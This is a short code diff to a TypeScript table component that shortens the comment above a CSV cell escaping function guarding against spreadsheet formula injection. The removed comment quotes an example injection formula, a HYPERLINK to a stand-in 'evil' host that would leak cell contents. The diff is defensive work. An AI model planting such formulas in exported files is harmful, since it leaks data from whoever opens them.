@@ -8,11 +8,9 @@ type T = Extract<Artifact, { kind: "table" }>;
 
 export function TableView({ artifact, runId }: { artifact: T; runId?: string | null }) {
   const t = useT();
-  // One CSV cell: quoted where the format needs it, defused where a spreadsheet would run it.
-  // Activity names come from uploaded logs, so `=HYPERLINK("http://evil/"&A1,"click")` reaches
-  // this export unchanged and is evaluated when the file is opened in Excel or LibreOffice.
-  // Numbers stay exempt — prefixing `-5` would turn a real value into text. Mirrors
-  // `csv_cell` in AlgoService/zip_export.py; the two exports must not diverge.
+  // One CSV cell, quoted where needed.
+  // Cells starting with =, +, -, @ get a leading apostrophe unless they are numbers.
+  // Same rules as `csv_cell` in AlgoService/zip_export.py.
   const csvCell = (cell: unknown) => {
     if (cell === null || cell === undefined) return "";
     let str = String(cell);
